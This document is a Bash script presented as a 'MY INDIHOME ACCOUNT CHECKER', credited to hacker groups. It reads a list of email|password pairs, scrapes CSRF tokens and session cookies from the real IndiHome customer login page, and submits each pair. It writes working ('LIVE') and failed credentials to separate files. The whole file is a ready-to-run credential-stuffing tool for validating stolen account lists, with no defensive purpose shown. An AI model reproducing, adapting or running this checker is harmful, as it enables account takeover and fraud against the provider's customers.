#!/bin/bash
RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
ORANGE='\033[0;33m'
PUR='\033[0;35m'
GRN="\e[32m"
WHI="\e[37m"
NC='\033[0m'

echo ""
printf "          $YELLOW              ######                  ######             \n"
printf "          $YELLOW              ######                  ######             \n"
printf "          $YELLOW              ######                  ######             \n"
printf "          $YELLOW          ######################################         \n"
printf "          $YELLOW          ######################################         \n"
printf "          $YELLOW          ######################################         \n"
printf "          $YELLOW      ##############################################     \n"
printf "          $YELLOW      ##########   ####################    #########     \n"
printf "          $YELLOW      ##########   ####################    #########     \n"
printf "          $YELLOW  ###################################################### 	\n"
printf "          $YELLOW  ###################################################### 	\n"
printf "          $YELLOW  ###################################################### 	\n"
printf "          $YELLOW  ###################################################### 	\n"
printf "          $YELLOW  #####   ######################################   ##### 	\n"
printf "          $YELLOW  #####   ######################################   ##### 	\n"
printf "          $YELLOW  #####   ######################################   ##### 	\n"
printf "          $YELLOW  #####   ######                           #####   ##### 	\n"
printf "          $YELLOW  #####   ######                           #####   ##### 	\n"
printf "          $YELLOW  #####   ######                           #####   ##### 	\n"
printf "          $YELLOW  #####   ##################   #################   ##### 	\n"
printf "          $YELLOW              ##############   ############# 	\n"
printf "          $YELLOW              ##############   ############# 	\n"
printf "          $YELLOW              ##############   ############# 	\n"
printf "   $WHI ============================================================ \n"
printf "   $YELLOW		      MY INDIHOME ACCOUNT CHECKER				\n"
printf "   $WHI ============================================================ \n"
printf "\n"
printf "   $RED		   	  [THANKS TO BY]				\n"
printf "   $RED       [✓] CODE BY CYBER CUPUY BRAVANI.CO \n"
printf "   $RED       [✓] BRAVANI.CO | BC0DE.NET | STUCK-CREW.NET | UANG.HARAM \n"
printf "   $RED       [✓] SGB TEAM REBORN | AlchaDecode | BRAVANI.CC \n"
printf "   $WHI ============================================================ \n"
printf "$NC\n"


# Asking user whenever the
# parameter is blank or null
  # Print available file on
  # current folder
  # clear
  read -p "Show Directory Tree(Y/n): " show
  if [[ ${show,,} == 'y' ]]; then
  echo ""
  tree
  echo ""
  fi
  read -p "Enter mailist file: " inputFile
  if [[ ! $inputFile ]]; then
  printf "$YELLOW Please input the file \n"
  exit
  fi
  if [ ! -e $inputFile ]; then
  printf "$YELLOW File not found \n"
  exit
  fi
  
  if [[ $targetFolder == '' ]]; then
  read -p "Enter target folder: " targetFolder
  # Check if result folder exists
  # then create if it didn't
  if [[ ! $targetFolder ]]; then
  echo "Creating Hasil/ folder"
    mkdir Hasil
    targetFolder="Hasil"
  fi
  if [[ ! -d "$targetFolder" ]]; then
    echo "Creating $targetFolder/ folder"
    mkdir $targetFolder
  else
    read -p "$targetFolder/ folder exists, append to them?(Y/n): " isAppend
    if [[ $isAppend == 'n' ]]; then
    printf "$YELLOW == Thanks For Using AlcSec == \n"
      exit
    fi
  fi
else
  if [[ ! -d "$targetFolder" ]]; then
    echo "Creating $targetFolder/ folder"
    mkdir $targetFolder
  fi
fi
totalLines=`grep -c "@" $inputFile`
con=1
printf "$CYAN=================================\n"
printf "$YELLOW       CHECKING PROCESS\n"
printf "$CYAN=================================\n"
check(){
header="`date +%H:%M:%S`"
curl=$(curl -c s_cookie.tmp 'https://my.indihome.co.id/login' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: https://my.indihome.co.id/verifikasiotp' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9' --compressed -D - -s -o page.tmp);
bando=$(cat page.tmp | grep 'name="bandorodimas"' | grep -Po '(?<=value=")[^"]*');
myih=$(cat page.tmp | grep 'name="csrf_myih"' | grep -Po '(?<=value=")[^"]*');
myih=$(echo $myih | cut -d " " -f 1);
csrf_cookie_name=$(cat s_cookie.tmp | grep 'csrf_cookie_name' | grep -Po '(?<=csrf_cookie_name	)[^ ]*');
ci_session_ih=$(cat s_cookie.tmp | grep 'ci_session_ih' | grep -Po '(?<=ci_session_ih	)[^ ]*');
pool_indihome_https=$(cat s_cookie.tmp | grep 'BIGipServer~DMZ~pool_indihome_https' | grep -Po '(?<=BIGipServer~DMZ~pool_indihome_https	)[^ ]*');
TS0119a8a9=$(cat s_cookie.tmp | grep 'TS0119a8a9' | grep -Po '(?<=TS0119a8a9	)[^ ]*');
rm page.tmp;
rm s_cookie.tmp;
login=$(curl -s -L 'https://my.indihome.co.id/login' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: https://my.indihome.co.id' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: https://my.indihome.co.id/login' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9' -H 'Cookie: BIGipServer~DMZ~pool_indihome_https='$pool_indihome_https'; _ga=GA1.3.338636642.1528134436; _gid=GA1.3.215739159.1528134436; csrf_cookie_name='$csrf_cookie_name'; ci_session_ih='$ci_session_ih'; TS0119a8a9='$TS0119a8a9'' --data 'bandorodimas='$bando'&txtEmail='$1'&txtPassword='$2'&csrf_myih='$myih'' --compressed -O login);
header="`date +%H:%M:%S`"
if  grep -q 'Gagal!' login; then
        printf "$RED DIE $CYAN[$header] $NC [ ./Alchmst] \n";
        echo "[DIE] $email|$pass">> $3/MyIndihomeDIE.tmp
elif grep -q 'Berhasil!' login; then
        printf "$GRN LIVE $CYAN[$header] $NC [ ./Alchmst] \n";
        echo "[LIVE] $email|$pass">> $3/MyIndihomeLIVE.tmp
else
        printf "$RED UNKNOWN $CYAN[$header] $NC [ ./Alchmst] \n";
        echo "[UNKNOWN] $email|$pass">> $3/MyIndihomeUNKNOWN.tmp
fi
rm login;
}
SECONDS=0
for mailpass in $(cat $inputFile); do
	email=$(echo $mailpass | cut -d "|" -f 1)
	pass=$(echo $mailpass | cut -d "|" -f 2)
	jmail=${#email}
	jpass=${#pass}
	indexer=$((con++))
	printf "$CYAN $totalLines/$indexer $NC $email|$pass - "
	check $email $pass $targetFolder
done
duration=$SECONDS
printf "$YELLOW $(($duration / 3600)) hours $(($duration / 60)) minutes and $(($duration % 60)) seconds elapsed. \n"
printf "$YELLOW=============== AlcSec - AlchaDecode =============== \n"
